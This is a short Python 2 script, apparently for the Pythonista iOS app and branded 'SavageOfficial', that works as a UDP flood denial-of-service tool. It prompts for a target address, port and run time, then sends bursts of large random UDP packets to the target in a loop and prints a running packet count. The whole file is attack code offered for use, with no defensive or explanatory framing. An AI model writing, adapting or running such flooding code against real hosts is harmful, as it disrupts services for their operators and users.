import socket, sys, os, time, itertools, threading, random, console, string

def credits():
	import console
	console.set_color(130, 0, 0)
	print "\n     -+--=:=-  -++-  -=:=--+-"
	console.set_color()
	console.set_font('HoeflerText-Black')
	print " " * 32 + "SavageOfficial"
	console.set_font()
	console.set_color(130, 0, 0)
	print "     -+--=:=-  -++-  -=:=--+-\n"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
	if sys.argv[1] <= 9:
		strength = sys.argv[1]
except:
	strength = 5
	pass

data = "".join(random.sample(string.ascii_letters*200,1024) * int(strength))

credits()
target = raw_input(' -+- Target: ')
port = input(' -+- Port: ')
duration = input(' -+- Run: ')
console.set_color()
print ""
timeout = time.time() + duration
sent = 0

while 1:
	if time.time() > timeout:
		break		
	else:
		pass
	try:
		s.sendto(data, (target, port))
		s.sendto(data, (target, port))
		s.sendto(data, (target, port))
		s.sendto(data, (target, port))
		s.sendto(data, (target, port))
	except ValueError as e:
		print e
	sent = sent + 5
	print "%s Packets: %s Port: %s "%(sent, target, port)
